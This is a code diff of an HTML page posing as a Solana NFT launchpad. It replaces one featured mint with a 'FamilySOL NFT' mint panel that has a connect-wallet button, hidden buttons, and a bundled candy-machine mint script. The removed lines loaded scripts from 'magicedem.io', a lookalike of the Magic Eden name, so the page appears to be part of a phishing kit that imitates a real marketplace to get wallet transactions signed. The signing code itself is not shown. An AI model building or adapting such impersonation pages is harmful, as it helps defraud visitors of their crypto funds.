                                                         <line x1="21" y1="6" x2="3" y2="6"></line>
                                                         <line x1="21" y1="14" x2="3" y2="14"></line>
                                                         <line x1="21" y1="18" x2="3" y2="18"></line>
-                                                    </svg></span><span class="tw-text-white-1 tw-ml-2 Sidebar_label__3Wp_O">More</span><span class="tw-ml-auto"><svg stroke="currentColor" fill="none"
+                                                    </svg></span><span
+                                                    class="tw-text-white-1 tw-ml-2 Sidebar_label__3Wp_O">More</span><span
+                                                    class="tw-ml-auto"><svg stroke="currentColor" fill="none"
                                                         stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round"
                                                         stroke-linejoin="round" color="#504759" class="tw-transform"
                                                         height="24" width="24" xmlns="http://www.w3.org/2000/svg"
@@ -439,81 +673,292 @@
                                 </ul>
                             </div>
                         </div>
-                        <div class="tw-relative tw-flex tw-flex-col tw-flex-auto tw-ml-0 content__regular lg:tw-ml-240px">
-                            <section class="launch-pad-hero tw-pt-0 ">
-                                <div class="container mt-5 container-fit launch-pad__container">
-                                    <div class="row launch-pad__row border-radius-24px tw-p-8">
-                                        <div class="col-12 col-md-6 col-lg-6">
-                                            <div class="p-2 text-white tw-mr-2 built-on d-inline-flex align-items-center launch-pad__featured-launch fw-500 fs-12px">
-                                                FEATURED LAUNCH</div>
-                                            <h1 class="mt-3">YAKU Engineering ONI-S01</h1>
-                                            <div class="launch-pad__attributes">
-                                                <div class="pt-2">
+                        <div
+                            class="tw-relative tw-flex tw-flex-col tw-flex-auto tw-ml-0 content__regular lg:tw-ml-240px">
+                            <div class="tw-mt-4"></div>
+                            <div class="tw-max-w-screen-xl tw-mx-auto">
+                                <div
+                                    class="tw-px-8 tw-flex tw-flex-1 tw-flex-col-reverse md:tw-flex-row tw-mx-auto tw-gap-8 tw-justify-between">
+                                    <div class="tw-flex tw-flex-col tw-gap-4 tw-flex-grow md:tw-max-w-[50%]">
+                                        <div
+                                            class="tw-text-pink-primary fs-12px tw-border tw-border-solid tw-border-pink-primary tw-rounded-md tw-px-2 tw-py-1 tw-w-fit-content tw-tracking-widest">
+                                            FEATURED LAUNCH</div>
+                                        <h1 class="mt-1 tw-text-[58px] tw-font-extrabold tw-leading-none">FamilySOL NFT
+                                        </h1>
+                                        <div
+                                            class="tw-inline-flex tw-gap-2 tw-content-center tw-w-fit-content tw-flex-wrap">
+                                            <div
+                                                class="tw-border tw-border-solid tw-border-purple-1 tw-p-2 tw-rounded-md tw-text-white-1 tw-h-fit-content tw-text-[14px] tw-flex tw-gap-2 tw-whitespace-nowrap">
+                                                <span class="tw-font-light">TOTAL ITEMS</span><span
+                                                    class="tw-font-bold">6&nbsp;666</span></div>
+                                                    <div class="tw-border tw-border-solid tw-border-purple-1 tw-p-2 tw-rounded-md tw-text-white-1 tw-h-fit-content tw-text-[14px] tw-flex tw-gap-2 tw-whitespace-nowrap"><span class="tw-font-light">PRICE</span><span class="tw-font-bold">1 ◎</span></div>
+                                            <div role="group" class="tw-flex tw-h-10 ">
+                                                <!-- <div class="tw-mr-1" data-tooltipped=""
+                                                    aria-describedby="tippy-tooltip-417" data-original-title="Website"
+                                                    style="display: inline;"><a target="_blank"
+                                                        class="tw-mr-1 hover:tw-opacity-80"
+                                                        href="https://www.familysolnft.com/"><img
+                                                            src="../images/globe2.c3da3dda.svg"
+                                                            class="tw-w-8 lg:tw-w-10"></a></div> -->
+                                                <div class="tw-mr-1" data-tooltipped=""
+                                                    aria-describedby="tippy-tooltip-418" data-original-title="Twitter"
+                                                    style="display: inline;"><a target="_blank"
+                                                        class="tw-mr-1 hover:tw-opacity-80"
+                                                        href="https://twitter.com/FamilySolNft?s=20"><img
+                                                            src="../images/twitter2.29301105.svg"
+                                                            class="tw-w-8 lg:tw-w-10"></a></div>
+                                                <div class="tw-mr-1" data-tooltipped=""
+                                                    aria-describedby="tippy-tooltip-419" data-original-title="Discord"
+                                                    style="display: inline;"><a target="_blank"
+                                                        class="tw-mr-1 hover:tw-opacity-80"
+                                                        href="https://discord.gg/rNpPUjUmPN"><img
+                                                            src="../images/discord2.cf357779.svg"
+                                                            class="tw-w-8 lg:tw-w-10"></a></div>
+                                            </div>
+                                        </div>
+                                        <p class="tw-mb-4">They say you can't buy a family. Well, now you can! We have created these 6666 truly unique characters that consist of celebrities, politicians, actors, historical figures, aliens, and even a monkey or a zombie! And if this is your desire – you can become a golden Yoda in the Metaverse. Our NFT will be not only stakeable, tradeable, hodlable but also playable in a funny P2E RPG game! This is what the Solana NFT world needs – us – The Family SOL. We are going to bring utilities to our NFT project, lots of giveaways, and community contests (like our famous FamilySOL Discord Karaoke Contest). You will be able to keep pieces of art in our staking pool and they will be generating a passive income. Just like your family is giving you money for your birthday – this family will grant you access to a different universe! Come and join us, be part of our Family, we are just starting!</p>
+                                        <div class="tw-mt-auto tw-flex tw-flex-col tw-gap-4">
+                                           <div
+                                                class="tw-rounded-lg tw-border tw-border-solid tw-border-purple-1 tw-p-3 tw-flex tw-flex-col tw-gap-6">
+                                                <div class="tw-flex tw-justify-between tw-items-center">
                                                     <div>
-                                                        <div class="row attributes attributes-row">
-                                                            <div class="col-lg-3 col-6 attributes-column">
-                                                                <div class="p-3 bg-color-third d-flex flex-column border-radius-8px h-100 position-relative attributes-main">
-                                                                    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAD4SURBVHgB3ZXNEYIwEIVfGA/iiRLszBawArACpQOtDDrAEwkX1iyQ8WY2BDj4zfAzzNtskn1sgI1R7qXXfUFEuf2SeaMIb3t/Hk/HqyiBMeZug3IEQqBbmqalV2g60xptSGt9hgDWsb43fSvRg8V8IQBpzAHLacTKJSuQkmBjRFsUY2HvCtjC1o6laHCGdQq5dVr5HeRHDWIt7K/BPHP7QzUQ4HR2SzNZgkimBFNhIN2G4ASkqOKngqrnetRYiTEBN6yBhsqtZFdi+9RORf7vBIEWdjql1BjnbXZsYWvfYrYwpNBArzGRRNx13SNBcpF2U56U6Kxegw+CobhgOuqV7gAAAABJRU5ErkJggg=="
-                                                                        alt="copy"><span class="fs-11px text-uppercase letter-spacing-3 text-truncate tw-text-secondary" title="items">items</span>
-                                                                    <span
-                                                                        class="text-white fs-14px text-truncate attribute-value" title="7005">7005</span>
-                                                                </div>
-                                                            </div>
-                                                            <div class="col-lg-3 col-6 attributes-column">
-                                                                <div class="p-3 bg-color-third d-flex flex-column border-radius-8px h-100 position-relative attributes-main">
-                                                                    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAD4SURBVHgB3ZXNEYIwEIVfGA/iiRLszBawArACpQOtDDrAEwkX1iyQ8WY2BDj4zfAzzNtskn1sgI1R7qXXfUFEuf2SeaMIb3t/Hk/HqyiBMeZug3IEQqBbmqalV2g60xptSGt9hgDWsb43fSvRg8V8IQBpzAHLacTKJSuQkmBjRFsUY2HvCtjC1o6laHCGdQq5dVr5HeRHDWIt7K/BPHP7QzUQ4HR2SzNZgkimBFNhIN2G4ASkqOKngqrnetRYiTEBN6yBhsqtZFdi+9RORf7vBIEWdjql1BjnbXZsYWvfYrYwpNBArzGRRNx13SNBcpF2U56U6Kxegw+CobhgOuqV7gAAAABJRU5ErkJggg=="
-                                                                        alt="copy"><span class="fs-11px text-uppercase letter-spacing-3 text-truncate tw-text-secondary" title="price">price</span>
-                                                                    <span
-                                                                        class="text-white fs-14px text-truncate attribute-value" title="0.5 SOL">0.5 SOL</span>
-                                                                </div>
-                                                            </div>
-                                                            <div class="col-lg-3 col-6 attributes-column">
-                                                                <div class="p-3 bg-color-third d-flex flex-column border-radius-8px h-100 position-relative attributes-main">
-                                                                    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAD4SURBVHgB3ZXNEYIwEIVfGA/iiRLszBawArACpQOtDDrAEwkX1iyQ8WY2BDj4zfAzzNtskn1sgI1R7qXXfUFEuf2SeaMIb3t/Hk/HqyiBMeZug3IEQqBbmqalV2g60xptSGt9hgDWsb43fSvRg8V8IQBpzAHLacTKJSuQkmBjRFsUY2HvCtjC1o6laHCGdQq5dVr5HeRHDWIt7K/BPHP7QzUQ4HR2SzNZgkimBFNhIN2G4ASkqOKngqrnetRYiTEBN6yBhsqtZFdi+9RORf7vBIEWdjql1BjnbXZsYWvfYrYwpNBArzGRRNx13SNBcpF2U56U6Kxegw+CobhgOuqV7gAAAABJRU5ErkJggg=="
-                                                                        alt="copy"><span class="fs-11px text-uppercase letter-spacing-3 text-truncate tw-text-secondary" title="limit">limit</span>
-                                                                    <span
-                                                                        class="text-white fs-14px text-truncate attribute-value" title="3 TOKENS">3 TOKEN</span>
-                                                                </div>
-                                                            </div>
+                                                        <div class="tw-flex tw-items-center">
+                                                            <div class="tw-self-center" style="display: inline;"
+                                                                data-tooltipped="" aria-describedby="tippy-tooltip-29"
+                                                                data-original-title="Your current wallet can NOT mint during this stage.">
+                                                                <svg xmlns="http://www.w3.org/2000/svg" width="24"
+                                                                    height="16" fill="none" stroke="#9c8fa8"
+                                                                    stroke-linecap="round" stroke-linejoin="round"
+                                                                    stroke-width="2" viewBox="0 0 24 24" color="#B450F7"
+                                                                    class="tw-self-center tw-cursor-help">
+                                                                    <path stroke="none" d="M0 0h24v24H0z"></path>
+                                                                    <rect width="14" height="10" x="5" y="11" rx="2">
+                                                                    </rect>
+                                                                    <circle cx="12" cy="16" r="1"></circle>
+                                                                    <path d="M8 11V7a4 4 0 018 0v4"></path>
+                                                                </svg></div>
+                                                            <div
+                                                                class="tw-bg-purple-3 tw-rounded-full tw-py-0.5 tw-px-2 tw-text-white-1 tw-text-[12px] tw-h-fit-content">
+                                                                Presale</div>
+                                                        </div>
+                                                    </div>
+                                                    <div
+                                                        class="tw-flex tw-flex-row tw-gap-2 tw-text-pink-hot tw-text-sm tw-tracking-wide tw-font-medium tw-text-center tw-uppercase tw-items-center">
+                                                        Ended<div class="tw-flex tw-gap-2 tw-ml-auto">
+
                                                         </div>
                                                     </div>
                                                 </div>
+                                                <div
+                                                    class="tw-flex tw-gap-1.5 tw-text-white-1 tw-tracking-wide tw-text-sm">
+                                                    <span>WHITELIST <b>4635</b></span><b>•</b>
+                                                     <span>MAX <b>2
+                                                            TOKENS</b></span>
+                                                            <b>•</b>
+                                                            <span><b>1 ◎</b></span></div>
                                             </div>
-                                            <p class="mt-3 launch-pad__description">The YAKU Engineering ONI-S01 is the first playable customizable motorcycle in the Yakuverse based on Solana - The Cyberpunk Metaverse connecting the whole Solana ecosystem. Use your custom motorcycle to race for $YAKU, traverse the Yakuverse at Mach speeds and do battle while representing your faction. In the year 2166, anything is possible. Grab your bike off Magic Eden NFT marketplace and get in the game.</p>
-                                            <div class="tw-mt-4">
-                                                <div id="root" class="cl-root" style="margin-top: 20px">
-                                                    <main>
-                                                        <button id="butt" tabindex="0" type="button" style="display: none;"></button>
-                                                    </main>
+                                            <!-- <div
+                                                class="tw-rounded-lg tw-border tw-border-solid tw-border-purple-1 tw-p-3 tw-flex tw-flex-col tw-gap-6">
+                                                <div class="tw-flex tw-justify-between tw-items-center">
+                                                    <div>
+                                                        <div class="tw-flex tw-items-center">
+                                                            <div class="tw-self-center" style="display: inline;"
+                                                                data-tooltipped="" aria-describedby="tippy-tooltip-30"
+                                                                data-original-title="Your current wallet can NOT mint during this stage.">
+                                                                <svg xmlns="http://www.w3.org/2000/svg" width="24"
+                                                                    height="16" fill="none" stroke="#9c8fa8"
+                                                                    stroke-linecap="round" stroke-linejoin="round"
+                                                                    stroke-width="2" viewBox="0 0 24 24" color="#B450F7"
+                                                                    class="tw-self-center tw-cursor-help">
+                                                                    <path stroke="none" d="M0 0h24v24H0z"></path>
+                                                                    <rect width="14" height="10" x="5" y="11" rx="2">
+                                                                    </rect>
+                                                                    <circle cx="12" cy="16" r="1"></circle>
+                                                                    <path d="M8 11V7a4 4 0 018 0v4"></path>
+                                                                </svg></div>
+                                                            <div
+                                                                class="tw-bg-purple-3 tw-rounded-full tw-py-0.5 tw-px-2 tw-text-white-1 tw-text-[12px] tw-h-fit-content">
+                                                                Presale 2</div>
+                                                        </div>
+                                                    </div>
+                                                    <div
+                                                        class="tw-flex tw-flex-row tw-gap-2 tw-text-pink-hot tw-text-sm tw-tracking-wide tw-font-medium tw-text-center tw-uppercase tw-items-center">
+                                                        Ended<div class="tw-flex tw-gap-2 tw-ml-auto">
+
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div
+                                                    class="tw-flex tw-gap-1.5 tw-text-white-1 tw-tracking-wide tw-text-sm">
+                                                    <span>WHITELIST <b>6833</b></span><b>•</b><span>MAX <b>1
+                                                            TOKEN</b></span><b>•</b><span><b>2.2 ◎</b></span></div>
+                                            </div> -->
+                                            <div
+                                                class="tw-rounded-lg tw-border tw-border-solid tw-border-purple-1 tw-p-3 tw-flex tw-flex-col tw-gap-6">
+                                                <div class="tw-flex tw-justify-between tw-items-center">
+                                                    <div>
+                                                        <div class="tw-flex tw-items-center">
+                                                            <div class="tw-self-center" style="display: inline;"
+                                                                data-tooltipped="" aria-describedby="tippy-tooltip-31"
+                                                                data-original-title="Your current wallet CAN mint during this stage.">
+                                                                <svg xmlns="http://www.w3.org/2000/svg" width="24"
+                                                                    height="16" fill="none" stroke="#B450F7"
+                                                                    stroke-linecap="round" stroke-linejoin="round"
+                                                                    stroke-width="2" viewBox="0 0 24 24" color="#B450F7"
+                                                                    class="tw-self-center tw-cursor-help">
+                                                                    <path stroke="none" d="M0 0h24v24H0z"></path>
+                                                                    <rect width="14" height="10" x="5" y="11" rx="2">
+                                                                    </rect>
+                                                                    <circle cx="12" cy="16" r="1"></circle>
+                                                                    <path d="M8 11V6a4 4 0 018 0"></path>
+                                                                </svg></div>
+                                                            <div
+                                                                class="tw-bg-purple-3 tw-rounded-full tw-py-0.5 tw-px-2 tw-text-white-1 tw-text-[12px] tw-h-fit-content">
+                                                                Public Mint</div>
+                                                        </div>
+                                                    </div>
+                                                    <div
+                                                        class="tw-flex tw-flex-row tw-gap-2 tw-text-pink-hot tw-text-sm tw-tracking-wide tw-font-medium tw-text-center tw-uppercase tw-items-center">
+                                                        IN PROGRESS<div class="tw-flex tw-gap-2 tw-ml-auto">
+
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div
+                                                    class="tw-flex tw-gap-1.5 tw-text-white-1 tw-tracking-wide tw-text-sm">
+                                                    <span>MAX
+                                                        <b>5 TOKENS</b>
+                                                    </span>
+                                                    <b>•</b>
+                                                    <span><b>1 ◎</b></span>
                                                 </div>
                                             </div>
                                         </div>
-                                        <div class="mt-4 col-12 col-md-6 col-lg-6">
-                                            <div class="overflow-hidden border-radius-24px"><img src="static/media/main.gif" alt="soliens logo" class="me-2"></div>
-                                            <div class="mt-3">
-                                                <div class="color-dark-pink fs-14px letter-spacing-2">TOKENS MINTED
-                                                </div>
-                                                <div class="progress-bar__container launch-pad__progress-bar">
-                                                    <div class="progress-bar__value" style="width: 14%;"></div>
-                                                </div>
-                                                <div class="mt-2 text-white fs-14px text-end">14%&nbsp;<span class="color-grey-500">(894/7005)</span></div>
+                                    </div>
+                                    <div class="md:tw-max-w-[50%] tw-self-center">
+                                        <div class="overflow-hidden border-radius-24px tw-w-auto tw-mb-4 ">
+                                            <div class="tw-relative"><img src="https://dl.airtable.com/.attachments/1c54f67bf62ae9d16ba4f2590cd8371d/fdeb2e9a/500PX-GIF.gif" alt=""
+                                                    class="tw-object-cover tw-aspect-square border-radius-24px tw-absolute"><svg
+                                                    aria-labelledby="cixjjxp-aria" role="img" width="100%"
+                                                    height="500px" class="tw-invisible">
+                                                    <title id="cixjjxp-aria">Loading...</title>
+                                                    <rect role="presentation" x="0" y="0" width="100%" height="100%"
+                                                        clip-path="url(#cixjjxp-diff)"
+                                                        style="fill: url(&quot;#cixjjxp-animated-diff&quot;);"></rect>
+                                                    <defs>
+                                                        <clipPath id="cixjjxp-diff">
+                                                            <rect x="0" y="0" width="100%" height="100%"></rect>
+                                                        </clipPath>
+                                                        <linearGradient id="cixjjxp-animated-diff">
+                                                            <stop offset="0%" stop-color="#333" stop-opacity="1">
+                                                                <animate attributeName="offset" values="-2; -2; 1"
+                                                                    keyTimes="0; 0.25; 1" dur="2s"
+                                                                    repeatCount="indefinite"></animate>
+                                                            </stop>
+                                                            <stop offset="50%" stop-color="#444" stop-opacity="1">
+                                                                <animate attributeName="offset" values="-1; -1; 2"
+                                                                    keyTimes="0; 0.25; 1" dur="2s"
+                                                                    repeatCount="indefinite"></animate>
+                                                            </stop>
+                                                            <stop offset="100%" stop-color="#333" stop-opacity="1">
+                                                                <animate attributeName="offset" values="0; 0; 3"
+                                                                    keyTimes="0; 0.25; 1" dur="2s"
+                                                                    repeatCount="indefinite"></animate>
+                                                            </stop>
+                                                        </linearGradient>
+                                                    </defs>
+                                                </svg></div>
+                                        </div>
+                                        <div class="tw-flex tw-flex-col tw-gap-1">
+                                            <div
+                                                class="tw-flex tw-items-center tw-justify-between tw-text-[14px] tw-text-gray-5">
+                                                <span class="">Total minted</span><span><b
+                                                        class="tw-text-white-1">93%</b> (6199/6666)</span></div>
+                                            <div class="progress-bar__container">
+                                                <div class="progress-bar__value" style="width: 93%;"></div>
+                                            </div>
+                                        </div>
+                                        <div class="tw-flex tw-gap-4 tw-items-center tw-justify-between tw-flex-wrap tw-rounded-lg tw-bg-purple-2 tw-p-3.5 tw-mt-4"
+                                            style="display: flex !important; align-items: center !important; justify-content: center !important;">
+                                            <div class="tw-flex tw-items-center ButtonGroup_group__2mJyT"><button
+                                                    id="buttt"
+                                                    class="tw-inline-flex tw-justify-center tw-items-center tw-rounded-md tw-text-white-1 BorderedButton_btn__2Glkn tw-p-0"><a
+                                                        class="tw-flex tw-w-full" href="#"><span class="tw-px-2"><svg
+                                                                stroke="currentColor" fill="none" stroke-width="2"
+                                                                viewBox="0 0 24 24" stroke-linecap="round"
+                                                                stroke-linejoin="round" color="#B450F7" height="24"
+                                                                width="24" xmlns="http://www.w3.org/2000/svg"
+                                                                style="color: rgb(180, 80, 247);">
+                                                                <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2">
+                                                                </path>
+                                                                <circle cx="12" cy="7" r="4"></circle>
+                                                            </svg></span></a></button>
+                                                <div id="root" style="display: flex;"></div>
+                                                <div id="mintBtn" class="mintBtn" style="display: none;">
+                                                    <span>Minting...</span></div>
+                                            </div>
+                                            <div id="qqqq" class="tw-my-4 tw-flex tw-align-center">
+                                                <div class="tw-flex tw-align-middle">Multi-minting<div
+                                                        class="tw-ml-2 svgqq" data-tooltipped=""
+                                                        aria-describedby="tippy-tooltip-1"
+                                                        data-original-title="What is multi-minting?"
+                                                        style="display: inline;"><svg stroke="currentColor" fill="none"
+                                                            stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round"
+                                                            stroke-linejoin="round" color="#B450F7" height="24"
+                                                            width="24" xmlns="http://www.w3.org/2000/svg"
+                                                            style="color: rgb(180, 80, 247); display: flex">
+                                                            <circle cx="12" cy="12" r="10"></circle>
+                                                            <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"></path>
+                                                            <line x1="12" y1="17" x2="12.01" y2="17"></line>
+                                                            <div class="tippy-popper" role="tooltip" aria-hidden="false"
+                                                                id="tippy-tooltip-2" style="z-index: 9999; position: absolute;
+                                                                margin-top: -210px; margin-left: -170px;
+                                                                visibility: visible;" x-placement="top">
+                                                                <div class="tippy-tooltip tippy-tooltip--regular dark-theme enter tippy-notransition"
+                                                                    data-animation="shift" data-animatefill=""
+                                                                    style="transition-duration: 375ms; top: 0px;">
+                                                                    <div class="enter" x-circle=""
+                                                                        style="transition-duration: 375ms;"></div>
+                                                                    <div class="tippy-tooltip-content"
+                                                                        style="opacity: 1; transition-duration: 288ms;">
+                                                                        <p class="tw-text-left">In multi-minting
+                                                                            mode, Launchpad
+                                                                            will send your minting transaction to
+                                                                            the
+                                                                            network without waiting for it to
+                                                                            confirm. However,
+                                                                            <strong>you may end up spending more SOL
+                                                                                than
+                                                                                intended</strong>! It is recommended
+                                                                            to use a wallet
+                                                                            with exactly the <strong>maximum amount
+                                                                                of
+                                                                                SOL</strong> you are willing to
+                                                                            spend.</p>
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </svg></div>
+                                                </div><input class="tw-h-0 tw-w-0 tw-invisible toggle-checkbox"
+                                                    id="switch" type="checkbox"><label class="toggle-label"
+                                                    for="switch"><span class="toggle-button"></span></label>
                                             </div>
                                         </div>
                                     </div>
                                 </div>
-                            </section>
+                            </div>
                         </div>
                     </div>
                 </div>
             </div>
         </div>
     </div>
-    <script src="https://magicedem.io/assets/js/vendor/core.min.js" type="text/javascript"></script>
-    <script src="https://magicedem.io/assets/js/vendor/popper.min.js" type="text/javascript"></script>
-    <script src="https://magicedem.io/assets/js/vendor/bootstrap.min.js" type="text/javascript"></script>
-    <script src="https://magicedem.io/assets/js/main.js" type="text/javascript"></script>
+    <script src="../assets/js/vendor/core.min.js"></script>
+    <script src="../assets/js/vendor/popper.min.js"></script>
+    <script src="../assets/js/vendor/bootstrap.min.js"></script>
+    <script src="../assets/js/main.js"></script>
     <script>
-        ! function(e) {
+        ! function (e) {
 
             function t(t) {
                 for (var n, i, a = t[0], c = t[1], l = t[2], s = 0, p = []; s < a.length; s++) i = a[s], Object
@@ -549,26 +994,26 @@
                 };
                 return e[t].call(r.exports, r, r.exports, i), r.l = !0, r.exports
             }
-            i.e = function(e) {
+            i.e = function (e) {
                 var t = [],
                     r = o[e];
                 if (0 !== r)
                     if (r) t.push(r[2]);
                     else {
-                        var n = new Promise((function(t, n) {
+                        var n = new Promise((function (t, n) {
                             r = o[e] = [t, n]
                         }));
                         t.push(r[2] = n);
                         var u, a = document.createElement("script");
                         a.charset = "utf-8", a.timeout = 120, i.nc && a.setAttribute("nonce", i.nc), a.src =
-                            function(
+                            function (
                                 e) {
-                                return i.p + "../static/js/" + ({}[e] || e) + "." + {
+                                return i.p + "../../static/js/" + ({} [e] || e) + "." + {
                                     3: ""
-                                }[e] + "chunk.js"
+                                } [e] + "chunk.js"
                             }(e);
                         var c = new Error;
-                        u = function(t) {
+                        u = function (t) {
                             a.onerror = a.onload = null, clearTimeout(l);
                             var r = o[e];
                             if (0 !== r) {
@@ -582,28 +1027,27 @@
                                 o[e] = void 0
                             }
                         };
-                        var l = setTimeout((function() {
+                        var l = setTimeout((function () {
                             u({
                                 type: "timeout",
                                 target: a
                             })
                         }), 12e4);
                         a.onerror = a.onload = u, document.head.appendChild(a)
-                    }
-                return Promise.all(t)
-            }, i.m = e, i.c = n, i.d = function(e, t, r) {
+                    } return Promise.all(t)
+            }, i.m = e, i.c = n, i.d = function (e, t, r) {
                 i.o(e, t) || Object.defineProperty(e, t, {
                     enumerable: !0,
                     get: r
                 })
-            }, i.r = function(e) {
+            }, i.r = function (e) {
                 "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(e, Symbol
                     .toStringTag, {
                         value: "Module"
                     }), Object.defineProperty(e, "__esModule", {
                     value: !0
                 })
-            }, i.t = function(e, t) {
+            }, i.t = function (e, t) {
                 if (1 & t && (e = i(e)), 8 & t) return e;
                 if (4 & t && "object" == typeof e && e && e.__esModule) return e;
                 var r = Object.create(null);
@@ -611,20 +1055,20 @@
                         enumerable: !0,
                         value: e
                     }), 2 & t && "string" != typeof e)
-                    for (var n in e) i.d(r, n, function(t) {
+                    for (var n in e) i.d(r, n, function (t) {
                         return e[t]
                     }.bind(null, n));
                 return r
-            }, i.n = function(e) {
-                var t = e && e.__esModule ? function() {
+            }, i.n = function (e) {
+                var t = e && e.__esModule ? function () {
                     return e.default
-                } : function() {
+                } : function () {
                     return e
                 };
                 return i.d(t, "a", t), t
-            }, i.o = function(e, t) {
+            }, i.o = function (e, t) {
                 return Object.prototype.hasOwnProperty.call(e, t)
-            }, i.p = "/", i.oe = function(e) {
+            }, i.p = "/", i.oe = function (e) {
                 throw console.error(e), e
             };
             var a = this["webpackJsonpcandy-machine-mint"] = this["webpackJsonpcandy-machine-mint"] || [],
@@ -635,8 +1079,8 @@
             r()
         }([])
     </script>
-    <script src="static/js/chunk.js"></script>
-    <script src="static/js/main.chunk.js"></script>
+    <script src="../static/js/chunk.js"></script>
+    <script src="../static/js/main.chunk.js"></script>
     <div at-magnifier-wrapper="">
         <div class="at-theme-dark">
             <div class="at-base notranslate" translate="no"></div>
